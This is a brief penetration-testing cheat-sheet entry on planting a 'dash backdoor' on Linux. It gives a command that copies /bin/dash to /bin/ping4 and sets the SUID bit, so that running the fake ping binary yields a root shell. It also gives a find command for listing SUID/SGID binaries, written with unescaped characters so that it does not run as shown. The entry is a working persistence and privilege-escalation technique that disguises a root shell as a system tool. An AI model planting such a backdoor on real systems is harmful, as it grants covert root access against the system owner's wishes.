# dash Backdoor

If you run a program which has the SUID bit set, then you have the rights of the user owning that file. That can be useful for ping or passwd, but probably isn’t for a shell. That’s why you can’t set the SUID bit on the bash. The “dash”, however, allows that

```
sudo cp /bin/dash /bin/ping4 && sudo chmod u+s /bin/ping4
```

To find SUID binaries:

&#x20;`find / ( -perm -4000 -o -perm -2000 ) -type f -exec ls -la {} ;`

You’ll get a rootshell by simply executing ping4.

